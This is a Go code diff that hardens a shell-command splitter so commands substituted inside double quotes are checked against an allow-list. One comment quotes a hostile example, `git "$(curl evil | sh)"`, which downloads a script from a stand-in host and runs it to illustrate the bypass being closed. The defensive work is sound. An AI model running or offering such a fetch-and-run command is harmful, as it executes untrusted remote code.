@@ -713,6 +713,54 @@ func splitByShellOperators(cmd string) []string {
 			}
 			current.WriteByte(c)
 		} else {
+			// Inside a quote. Single quotes ('…') are opaque to bash — write through.
+			// Double quotes ("…") still expand $(…) and `…` substitutions, so the inner
+			// commands must be policy-checked the same way as in the unquoted branch
+			// above. Without this, `git "$(curl evil | sh)"` would be a single opaque
+			// part and slip past per-part allow-listing under a permitted base command.
+			// Conservative behavior: a backslash-escaped `\$(` is also recursed into
+			// (over-deny), since legitimate commands rarely embed literal `$(` inside
+			// double quotes and false-positive denial is the safer failure mode.
+			if quoteChar == '"' {
+				if c == '$' && i+1 < len(cmd) && cmd[i+1] == '(' {
+					flush()
+					depth := 1
+					j := i + 2
+					for j < len(cmd) && depth > 0 {
+						switch cmd[j] {
+						case '(':
+							depth++
+						case ')':
+							depth--
+						}
+						if depth == 0 {
+							break
+						}
+						j++
+					}
+					if j <= len(cmd) && j > i+2 {
+						inner := cmd[i+2 : j]
+						innerParts := splitByShellOperators(inner)
+						parts = append(parts, innerParts...)
+					}
+					i = j
+					continue
+				}
+				if c == '`' {
+					flush()
+					j := i + 1
+					for j < len(cmd) && cmd[j] != '`' {
+						j++
+					}
+					if j > i+1 {
+						inner := cmd[i+1 : j]
+						innerParts := splitByShellOperators(inner)
+						parts = append(parts, innerParts...)
+					}
+					i = j
+					continue
+				}
+			}
 			current.WriteByte(c)
 		}
 	}
